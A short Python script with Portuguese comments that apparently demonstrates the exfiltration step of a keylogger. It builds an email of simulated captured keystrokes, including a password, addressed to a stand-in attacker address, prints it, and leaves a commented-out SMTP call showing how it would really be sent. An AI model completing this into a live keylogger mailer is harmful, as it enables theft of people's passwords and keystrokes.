# Simulação de envio de logs por e-mail (não envia de verdade!)
import smtplib
from email.mime.text import MIMEText
from datetime import datetime

def simular_envio_logs(destinatario="attacker@falso.com"):
    # Simula logs
    logs = "Teclas capturadas: a b c [ENTER] senha123 [SPACE]"
    
    msg = MIMEText(logs)
    msg['Subject'] = f"Keylog Report - {datetime.now().strftime('%Y-%m-%d %H:%M')}"
    msg['From'] = "keylogger@falso.com"
    msg['To'] = destinatario
    
    print("[!] SIMULAÇÃO: E-mail com logs seria enviado para", destinatario)
    print("Conteúdo simulado:")
    print(msg.get_payload())
    # Em real: server = smtplib.SMTP('smtp.gmail.com', 587); server.send_message(msg)

if __name__ == "__main__":
    simular_envio_logs()
